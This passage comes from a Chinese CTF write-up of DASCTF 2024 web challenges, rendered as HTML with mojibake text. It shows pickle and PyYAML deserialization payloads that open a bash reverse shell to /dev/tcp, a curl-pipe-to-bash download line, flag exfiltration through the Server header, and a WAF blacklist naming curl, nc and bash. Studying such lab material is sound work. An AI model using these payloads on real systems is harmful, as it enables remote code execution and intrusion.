class="hljs-string">&quot;co_cellvars&quot;</span>)<br><br>g19 = types.CodeType(g3,g4,g5,g6,g7,g8,g9,g10,g11,g12,g13,g14,g15,g16,g17,g18)<br>g20 = builtins.<span class="hljs-built_in">setattr</span><br>g20(src,<span class="hljs-string">&quot;__code__&quot;</span>,g19)<br><span class="hljs-built_in">print</span>(src())<br></code></pre></td></tr></table></figure><p><img src="/2025/02/07/DASCTF-2024%E6%9C%80%E5%90%8E%E4%B8%80%E6%88%98-WEB%E5%A4%8D%E7%8E%B0/image-20250207173426028.png" alt="image-20250207173426028"></p><p>æ„é€ payloadï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br></pre></td><td class="code"><pre><code class="hljs python">op3 = <span class="hljs-string">b&#x27;&#x27;&#x27;cbuiltins</span><br><span class="hljs-string">getattr</span><br><span class="hljs-string">p0</span><br><span class="hljs-string">c__main__</span><br><span class="hljs-string">src</span><br><span class="hljs-string">p3</span><br><span class="hljs-string">g0</span><br><span class="hljs-string">(g3</span><br><span class="hljs-string">S&#x27;__code__&#x27;</span><br><span class="hljs-string">tRp4</span><br><span class="hljs-string">g0</span><br><span class="hljs-string">(g4</span><br><span class="hljs-string">S&#x27;co_argcount&#x27;</span><br><span class="hljs-string">tRp5</span><br><span class="hljs-string">g0</span><br><span class="hljs-string">(g4</span><br><span class="hljs-string">S&#x27;co_argcount&#x27;</span><br><span class="hljs-string">tRp6</span><br><span class="hljs-string">g0</span><br><span class="hljs-string">(g4</span><br><span class="hljs-string">S&#x27;co_kwonlyargcount&#x27;</span><br><span class="hljs-string">tRp7</span><br><span class="hljs-string">g0</span><br><span class="hljs-string">(g4</span><br><span class="hljs-string">S&#x27;co_nlocals&#x27;</span><br><span class="hljs-string">tRp8</span><br><span class="hljs-string">g0</span><br><span class="hljs-string">(g4</span><br><span class="hljs-string">S&#x27;co_stacksize&#x27;</span><br><span class="hljs-string">tRp9</span><br><span class="hljs-string">g0</span><br><span class="hljs-string">(g4</span><br><span class="hljs-string">S&#x27;co_flags&#x27;</span><br><span class="hljs-string">tRp10</span><br><span class="hljs-string">g0</span><br><span class="hljs-string">(g4</span><br><span class="hljs-string">S&#x27;co_code&#x27;</span><br><span class="hljs-string">tRp11</span><br><span class="hljs-string">(NS&#x27;/flag&#x27;</span><br><span class="hljs-string">S&#x27;r&#x27;</span><br><span class="hljs-string">S&#x27;utf-8&#x27;</span><br><span class="hljs-string">(S&#x27;encoding&#x27;</span><br><span class="hljs-string">ttp12</span><br><span class="hljs-string">g0</span><br><span class="hljs-string">(g4</span><br><span class="hljs-string">S&#x27;co_names&#x27;</span><br><span class="hljs-string">tRp13</span><br><span class="hljs-string">g0</span><br><span class="hljs-string">(g4</span><br><span class="hljs-string">S&#x27;co_varnames&#x27;</span><br><span class="hljs-string">tRp14</span><br><span class="hljs-string">g0</span><br><span class="hljs-string">(g4</span><br><span class="hljs-string">S&#x27;co_filename&#x27;</span><br><span class="hljs-string">tRp15</span><br><span class="hljs-string">g0</span><br><span class="hljs-string">(g4</span><br><span class="hljs-string">S&#x27;co_name&#x27;</span><br><span class="hljs-string">tRp16</span><br><span class="hljs-string">g0</span><br><span class="hljs-string">(g4</span><br><span class="hljs-string">S&#x27;co_firstlineno&#x27;</span><br><span class="hljs-string">tRp17</span><br><span class="hljs-string">g0</span><br><span class="hljs-string">(g4</span><br><span class="hljs-string">S&#x27;co_lnotab&#x27;</span><br><span class="hljs-string">tRp18</span><br><span class="hljs-string">g0</span><br><span class="hljs-string">(g4</span><br><span class="hljs-string">S&#x27;co_freevars&#x27;</span><br><span class="hljs-string">tRp19</span><br><span class="hljs-string">g0</span><br><span class="hljs-string">(g4</span><br><span class="hljs-string">S&#x27;co_cellvars&#x27;</span><br><span class="hljs-string">tRp20</span><br><span class="hljs-string">ctypes</span><br><span class="hljs-string">CodeType</span><br><span class="hljs-string">(g5</span><br><span class="hljs-string">I0</span><br><span class="hljs-string">g7</span><br><span class="hljs-string">g8</span><br><span class="hljs-string">g9</span><br><span class="hljs-string">g10</span><br><span class="hljs-string">g11</span><br><span class="hljs-string">g12</span><br><span class="hljs-string">g13</span><br><span class="hljs-string">g14</span><br><span class="hljs-string">g15</span><br><span class="hljs-string">g16</span><br><span class="hljs-string">g17</span><br><span class="hljs-string">g18</span><br><span class="hljs-string">g19</span><br><span class="hljs-string">g20</span><br><span class="hljs-string">tRp21</span><br><span class="hljs-string">cbuiltins</span><br><span class="hljs-string">setattr</span><br><span class="hljs-string">(g3</span><br><span class="hljs-string">S&quot;__code__&quot;</span><br><span class="hljs-string">g21</span><br><span class="hljs-string">tR.&#x27;&#x27;&#x27;</span><br></code></pre></td></tr></table></figure><p>è·å–<code>builtins</code>çš„<code>getattr</code>æ–¹æ³•,é€šè¿‡<code>getattr</code>è·å–åˆ°<code>src</code>çš„<code>__code__</code>,ç»§è€Œè·å¾—<code>co_const</code>ç­‰å‚æ•°,è·å–<code>builtins</code>çš„<code>setattr</code>,ä¿®æ”¹<code>__code__</code>ä¸ºæ–°çš„<code>CodeType</code>ã€‚</p><h2 id="yaml-matser"><a href="#yaml-matser" class="headerlink" title="yaml_matser"></a>yaml_matser</h2><p>ç»™å‡ºäº†æºç ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">import</span> re<br><span class="hljs-keyword">import</span> yaml<br><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask, request, jsonify, render_template<br><br><br>app = Flask(__name__, template_folder=<span class="hljs-string">&#x27;templates&#x27;</span>)<br><br>UPLOAD_FOLDER = <span class="hljs-string">&#x27;uploads&#x27;</span><br>os.makedirs(UPLOAD_FOLDER, exist_ok=<span class="hljs-literal">True</span>)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">waf</span>(<span class="hljs-params">input_str</span>):<br><br><br>    blacklist_terms = &#123;<span class="hljs-string">&#x27;apply&#x27;</span>, <span class="hljs-string">&#x27;subprocess&#x27;</span>,<span class="hljs-string">&#x27;os&#x27;</span>,<span class="hljs-string">&#x27;map&#x27;</span>, <span class="hljs-string">&#x27;system&#x27;</span>, <span class="hljs-string">&#x27;popen&#x27;</span>, <span class="hljs-string">&#x27;eval&#x27;</span>, <span class="hljs-string">&#x27;sleep&#x27;</span>, <span class="hljs-string">&#x27;setstate&#x27;</span>,<br>                       <span class="hljs-string">&#x27;command&#x27;</span>,<span class="hljs-string">&#x27;static&#x27;</span>,<span class="hljs-string">&#x27;templates&#x27;</span>,<span class="hljs-string">&#x27;session&#x27;</span>,<span class="hljs-string">&#x27;&amp;&#x27;</span>,<span class="hljs-string">&#x27;globals&#x27;</span>,<span class="hljs-string">&#x27;builtins&#x27;</span><br>                       <span class="hljs-string">&#x27;run&#x27;</span>, <span class="hljs-string">&#x27;ntimeit&#x27;</span>, <span class="hljs-string">&#x27;bash&#x27;</span>, <span class="hljs-string">&#x27;zsh&#x27;</span>, <span class="hljs-string">&#x27;sh&#x27;</span>, <span class="hljs-string">&#x27;curl&#x27;</span>, <span class="hljs-string">&#x27;nc&#x27;</span>, <span class="hljs-string">&#x27;env&#x27;</span>, <span class="hljs-string">&#x27;before_request&#x27;</span>, <span class="hljs-string">&#x27;after_request&#x27;</span>,<br>                       <span class="hljs-string">&#x27;error_handler&#x27;</span>, <span class="hljs-string">&#x27;add_url_rule&#x27;</span>,<span class="hljs-string">&#x27;teardown_request&#x27;</span>,<span class="hljs-string">&#x27;teardown_appcontext&#x27;</span>,<span class="hljs-string">&#x27;\\u&#x27;</span>,<span class="hljs-string">&#x27;\\x&#x27;</span>,<span class="hljs-string">&#x27;+&#x27;</span>,<span class="hljs-string">&#x27;base64&#x27;</span>,<span class="hljs-string">&#x27;join&#x27;</span>&#125;<br><br>    input_str_lower = <span class="hljs-built_in">str</span>(input_str).lower()<br><br><br>    <span class="hljs-keyword">for</span> term <span class="hljs-keyword">in</span> blacklist_terms:<br>        <span class="hljs-keyword">if</span> term <span class="hljs-keyword">in</span> input_str_lower:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Found blacklisted term: <span class="hljs-subst">&#123;term&#125;</span>&quot;</span>)<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><br><br><br>file_pattern = re.<span class="hljs-built_in">compile</span>(<span class="hljs-string">r&#x27;.*\.yaml$&#x27;</span>)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">is_yaml_file</span>(<span class="hljs-params">filename</span>):<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">bool</span>(file_pattern.<span class="hljs-keyword">match</span>(filename))<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">index</span>():<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">    Welcome to DASCTF X 0psu3</span><br><span class="hljs-string">    &lt;br&gt;</span><br><span class="hljs-string">    Here is the challenge &lt;a href=&quot;/upload&quot;&gt;Upload file&lt;/a&gt;</span><br><span class="hljs-string">    &lt;br&gt;</span><br><span class="hljs-string">    Enjoy it &lt;a href=&quot;/Yam1&quot;&gt;Yam1&lt;/a&gt;</span><br><span class="hljs-string">    &#x27;&#x27;&#x27;</span><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/upload&#x27;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>, <span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">upload_file</span>():<br>    <span class="hljs-keyword">if</span> request.method == <span class="hljs-string">&#x27;POST&#x27;</span>:<br>        <span class="hljs-keyword">try</span>:<br>            uploaded_file = request.files[<span class="hljs-string">&#x27;file&#x27;</span>]<br><br>            <span class="hljs-keyword">if</span> uploaded_file <span class="hljs-keyword">and</span> is_yaml_file(uploaded_file.filename):<br>                file_path = os.path.join(UPLOAD_FOLDER, uploaded_file.filename)<br>                uploaded_file.save(file_path)<br><br>                <span class="hljs-keyword">return</span> jsonify(&#123;<span class="hljs-string">&quot;message&quot;</span>: <span class="hljs-string">&quot;uploaded successfully&quot;</span>&#125;), <span class="hljs-number">200</span><br>            <span class="hljs-keyword">else</span>:<br>                <span class="hljs-keyword">return</span> jsonify(&#123;<span class="hljs-string">&quot;error&quot;</span>: <span class="hljs-string">&quot;Just YAML file&quot;</span>&#125;), <span class="hljs-number">400</span><br><br>        <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>            <span class="hljs-keyword">return</span> jsonify(&#123;<span class="hljs-string">&quot;error&quot;</span>: <span class="hljs-built_in">str</span>(e)&#125;), <span class="hljs-number">500</span><br><br><br>    <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;upload.html&#x27;</span>)<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/Yam1&#x27;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>, <span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">Yam1</span>():<br>    filename = request.args.get(<span class="hljs-string">&#x27;filename&#x27;</span>,<span class="hljs-string">&#x27;&#x27;</span>)<br>    <span class="hljs-keyword">if</span> filename:<br>        <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">f&#x27;uploads/<span class="hljs-subst">&#123;filename&#125;</span>.yaml&#x27;</span>, <span class="hljs-string">&#x27;rb&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>            file_content = f.read()<br>        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> waf(file_content):<br>            test = yaml.load(file_content)<br>            <span class="hljs-built_in">print</span>(test)<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;welcome&#x27;</span><br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    app.run()<br></code></pre></td></tr></table></figure><p>åˆæ˜¯ç»•wafï¼Œè¿™é‡Œå¯ä»¥ç”¨ç›´æ¥ç”¨execæ‰“æ–°ç‰ˆpyyamlï¼Œä¸­é—´ç”¨ä¸€ä¸‹åå…­è¿›åˆ¶å°±å¥½äº†ã€‚</p><ol><li>æ„é€ yamlæ–‡ä»¶</li></ol><p>ç›´æ¥ç”¨type+tupleï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python">!!python/<span class="hljs-built_in">object</span>/new:<span class="hljs-built_in">type</span><br>    args:<br>     - exp<br>     - !!python/<span class="hljs-built_in">tuple</span> []<br>     - &#123;<span class="hljs-string">&quot;extend&quot;</span>: !!python/name:<span class="hljs-built_in">exec</span> &#125;<br>    listitems: |<br>    <span class="hljs-string">&#x27;python code&#x27;</span><br></code></pre></td></tr></table></figure><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-type">!!python/object/new:type</span><br><br><span class="hljs-attr">args:</span> [<span class="hljs-string">&quot;z&quot;</span>, <span class="hljs-type">!!python/tuple</span> [], &#123;<span class="hljs-attr">&quot;extend&quot;:</span> <span class="hljs-type">!!python/name:exec</span> &#125;]<br><br><span class="hljs-attr">listitems:</span> <span class="hljs-string">&quot;exec(bytes.fromhex(&#x27;5f5f696d706f72745f5f28276f7327292e73797374656d282762617368202d63205c27657865632062617368202d69203e26202f6465762f7463702f7670732f706f727420303e263120323e26315c272729&#x27;).decode())&quot;</span><br></code></pre></td></tr></table></figure><p>å…¶ä¸­hexéƒ¨åˆ†base64è§£ç å¦‚ä¸‹:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-built_in">__import__</span>(<span class="hljs-string">&#x27;os&#x27;</span>).system(<span class="hljs-string">&#x27;bash -c \&#x27;exec bash -i &gt;&amp; /dev/tcp/vps/port 0&gt;&amp;1 2&gt;&amp;1\&#x27;&#x27;</span>)<br></code></pre></td></tr></table></figure><p>ä¸Šä¼ åç›´æ¥æ‰“ï¼š</p><p><img src="/2025/02/07/DASCTF-2024%E6%9C%80%E5%90%8E%E4%B8%80%E6%88%98-WEB%E5%A4%8D%E7%8E%B0/image-20250207174334564.png" alt="image-20250207174334564"></p><p>å®˜æ–¹wpä½¿ç”¨çš„æ˜¯é€šè¿‡Serverè¯·æ±‚å¤´å¸¦å‡ºå‘½ä»¤å›æ˜¾</p><p><code>werkzeug.serving.WSGIRequestHandler</code>è¿™ä¸ªå¤„ç†å™¨æ˜¯ç”¨æ¥å¤„ç†è¯·æ±‚å¤´çš„</p><p><code>Server</code>å¤´çš„å€¼æ˜¯<code>server_version</code>å±æ€§å’Œ<code>sys_version</code>å±æ€§æ‹¼æ¥åœ¨ä¸€èµ·çš„</p><p>é‚£æˆ‘ä»¬åªéœ€è¦æƒ³åŠæ³•ä¿®æ”¹<code>server_version</code>å±æ€§æˆ–è€…<code>sys_version</code>å±æ€§å³å¯å¸¦å‡ºæ•°æ®äº†ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> werkzeug<br><span class="hljs-built_in">setattr</span>(werkzeug.serving.WSGIRequestHandler, <span class="hljs-string">&quot;server_version&quot;</span>,<span class="hljs-string">&#x27;æƒ³è¦å¸¦å‡ºçš„æ•°æ®&#x27;</span> )<br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python">!!python/<span class="hljs-built_in">object</span>/new:<span class="hljs-built_in">type</span><br>        args:<br>         - exp<br>         - !!python/<span class="hljs-built_in">tuple</span> []<br>         - &#123;<span class="hljs-string">&quot;extend&quot;</span>: !!python/name:<span class="hljs-built_in">exec</span> &#125;<br>        listitems: |<br>         bb=<span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;/flag&quot;</span>).read()<br>         <span class="hljs-keyword">import</span> werkzeug<br>         <span class="hljs-built_in">setattr</span>(werkzeug.serving.WSGIRequestHandler, <span class="hljs-string">&quot;server_version&quot;</span>,bb )<br></code></pre></td></tr></table></figure><p>ç„¶åå‘åŒ…æŸ¥çœ‹<code>HTTPheaders</code>å°±è¡Œäº†ã€‚</p><p>å½“ç„¶ç»•è¿‡çš„æ–¹æ³•åƒå¥‡ç™¾æ€ªï¼Œåƒè¿™ç§<code>bytes([]).decode()</code>ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python">!!python/<span class="hljs-built_in">object</span>/new:<span class="hljs-built_in">type</span><br>args: [<span class="hljs-string">&#x27;z&#x27;</span>, !!python/<span class="hljs-built_in">tuple</span> [], &#123;<span class="hljs-string">&#x27;extend&#x27;</span>: !!python/name:<span class="hljs-built_in">exec</span> &#125;]<br>listitems: <span class="hljs-string">&#x27;__import__(bytes([111,115]).decode()).__getattribute__(bytes([115,121,115,116,101,109]).decode())(bytes([98,97,115,104,32,45,99,32,34,98,97,115,104,32,45,105,32,62,38,32,47,100,101,118,47,116,99,112,47,105,112,47,112,111,114,116,32,48,62,38,49,34]).decode())&#x27;</span><br><span class="hljs-comment"># __import__(&#x27;os&#x27;).__getattribute__(&#x27;system&#x27;)(&#x27;bash -c &quot;bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1&quot;&#x27;)</span><br></code></pre></td></tr></table></figure><p>è¿˜æœ‰ï¼š<a href="https://xz.aliyun.com/t/13281?time__1311=GqmxuD0DnD9D2iDlh+t0=KcDWqYvj+RIbpD#toc-6%E7%9A%84%E5%80%9F%E9%89%B4%EF%BC%8C%E5%8F%AF%E4%BB%A5%E7%9C%8B%E7%9C%8B%E7%BB%95%E8%BF%87%E6%80%9D%E8%B7%AF%EF%BC%9A">https://xz.aliyun.com/t/13281?time__1311=GqmxuD0DnD9D2iDlh+t0=KcDWqYvj+RIbpD#toc-6çš„å€Ÿé‰´ï¼Œå¯ä»¥çœ‹çœ‹ç»•è¿‡æ€è·¯ï¼š</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python">exp = <span class="hljs-string">&#x27;__import__(&quot;os&quot;).system(&quot;curl http://shell.txt|bash&quot;)&#x27;</span><br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;exec(bytes([[j][0]for(i)in[range(<span class="hljs-subst">&#123;<span class="hljs-built_in">len</span>(exp)&#125;</span>)][0]for(j)in[range(256)][0]if[&quot;</span>+<span class="hljs-string">&quot;]]or[&quot;</span>.join([<span class="hljs-string">f&quot;i]in[[<span class="hljs-subst">&#123;i&#125;</span>]]and[j]in[[<span class="hljs-subst">&#123;<span class="hljs-built_in">ord</span>(j)&#125;</span>&quot;</span> <span class="hljs-keyword">for</span> i, j <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(exp)]) + <span class="hljs-string">&quot;]]]))&quot;</span>)<br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python">!!python/<span class="hljs-built_in">object</span>/new:<span class="hljs-built_in">type</span><br>args:<br>  - exp<br>  - !!python/<span class="hljs-built_in">tuple</span> []<br>  - &#123;<span class="hljs-string">&quot;extend&quot;</span>: !!python/name:<span class="hljs-built_in">exec</span> &#125;<br>listitems: <span class="hljs-string">&quot;ä¸Šé¢çš„è„šæœ¬è¾“å‡ºçš„ç»“æœ&quot;</span><br></code></pre></td></tr></table></figure><p>æœ‰å…´è¶£å¯ä»¥ç»§ç»­ç ”ç©¶ç ”ç©¶ã€‚</p><h2 id="strange-php"><a href="#strange-php" class="headerlink" title="strange_php"></a>strange_php</h2><p>1è§£é¢˜ï¼Œåº”è¯¥æ˜¯æœ€å¼€å§‹ç ”ç©¶è¿™ä¸ªtrickçš„å¸ˆå‚…åšå‡ºæ¥äº†ã€‚</p><p>è¿™é“é¢˜<code>path</code>å¯æ§ï¼Œè‚¯å®šæ˜¯æ‰“<code>phar</code>ï¼Œè¿™ä¸éš¾æƒ³åˆ°ï¼Œå› ä¸ºæ–‡ä»¶ä¸Šä¼ +phpååºåˆ—åŒ–+unlinkè§¦å‘ç‚¹åŸºæœ¬æ²¡è·‘äº†ã€‚</p><p>æ€è·¯åœ¨æ­¤ï¼š</p><p><a href="https://www.cnblogs.com/cyyyyi/p/17947698">ctfshowå…ƒæ—¦æ°´å‹èµ›web easy_loginè¯¦è§£ - cyyyyi - åšå®¢å›­</a></p><p>ä¸»é€»è¾‘æ˜¯æœ‰ä»»æ„txtå†™å’Œåˆ é™¤åŠŸèƒ½ã€‚</p><p>ä»<code>User.php</code>å’Œ<code>UserMessage.php</code>å¯ä»¥æ‰¾å‡ºä¸€æ¡ååºåˆ—åŒ–é“¾ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">log</span>(<span class="hljs-params"></span>)</span>&#123;<br>  <span class="hljs-keyword">try</span>&#123;<br><br>    <span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;select * from users where username = :username&quot;</span>;<br>    <span class="hljs-variable">$pdo</span> = <span class="hljs-variable language_">$this</span>-&gt;conn-&gt;<span class="hljs-title function_ invoke__">get_connection</span>();<br>    <span class="hljs-variable">$stmt</span> = <span class="hljs-variable">$pdo</span>-&gt;<span class="hljs-title function_ invoke__">prepare</span>(<span class="hljs-variable">$sql</span>);<br><br>    <span class="hljs-variable">$stmt</span>-&gt;<span class="hljs-title function_ invoke__">bindParam</span>(<span class="hljs-string">&#x27;:username&#x27;</span>, <span class="hljs-variable">$this</span>-&gt;username);<br>    <span class="hljs-variable">$stmt</span>-&gt;<span class="hljs-title function_ invoke__">execute</span>();<br>    <span class="hljs-variable">$result</span> = <span class="hljs-variable">$stmt</span>-&gt;<span class="hljs-title function_ invoke__">fetch</span>();<br>    <span class="hljs-keyword">return</span> <span class="hljs-variable">$result</span>;<br>  &#125;<span class="hljs-keyword">catch</span> (PDOException <span class="hljs-variable">$e</span>)&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$e</span>-&gt;<span class="hljs-title function_ invoke__">getMessage</span>();<br>  &#125;<br><br>&#125;<br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">  </span>&#123;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;username)&#123;<br>      <span class="hljs-variable">$results</span> = <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">log</span>();<br>      <span class="hljs-variable">$log_mess</span> = <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$results</span>);<br><br>      <span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$this</span>-&gt;username).<span class="hljs-string">&quot;.txt&quot;</span>, <span class="hljs-variable">$log_mess</span>.<span class="hljs-string">&quot;\n&quot;</span>, FILE_APPEND);<br><br>    &#125;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;clean)&#123;<br>      <span class="hljs-title function_ invoke__">exec</span>(<span class="hljs-string">&quot;rm log/* txt/*&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__set</span>(<span class="hljs-params"><span class="hljs-variable">$name</span>, <span class="hljs-variable">$value</span></span>)</span><br><span class="hljs-function">  </span>&#123;<br>    <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-variable">$name</span> = <span 